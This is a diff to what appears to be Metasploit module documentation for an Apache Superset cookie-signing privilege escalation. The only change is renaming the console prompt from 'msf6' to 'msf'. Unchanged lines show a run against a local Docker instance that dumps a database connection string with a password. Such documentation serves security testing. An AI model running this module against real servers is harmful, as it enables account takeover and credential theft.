@@ -59,16 +59,16 @@ A file containing secret keys to try. One per line. Defaults to `metasploit-fram
 ### Superset 2.0.0 Docker image
 
 ```
-msf6 > use auxiliary/gather/apache_superset_cookie_sig_priv_esc 
-msf6 auxiliary(gather/apache_superset_priv_esc) > set rhosts 127.0.0.1
+msf > use auxiliary/gather/apache_superset_cookie_sig_priv_esc 
+msf auxiliary(gather/apache_superset_priv_esc) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(gather/apache_superset_priv_esc) > set username user
+msf auxiliary(gather/apache_superset_priv_esc) > set username user
 username => user
-msf6 auxiliary(gather/apache_superset_priv_esc) > set password user
+msf auxiliary(gather/apache_superset_priv_esc) > set password user
 password => user
-msf6 auxiliary(gather/apache_superset_priv_esc) > set verbose true
+msf auxiliary(gather/apache_superset_priv_esc) > set verbose true
 verbose => true
-msf6 auxiliary(gather/apache_superset_priv_esc) > run
+msf auxiliary(gather/apache_superset_priv_esc) > run
 [*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -90,7 +90,7 @@ msf6 auxiliary(gather/apache_superset_priv_esc) > run
 [+] Found Super Secret DB: postgresql://dbuser:mysecretpassword@1.1.1.1:15432/supersetdb
 [*] Done enumerating databases
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/apache_superset_priv_esc) > creds
+msf auxiliary(gather/apache_superset_priv_esc) > creds
 Credentials
 ===========
 
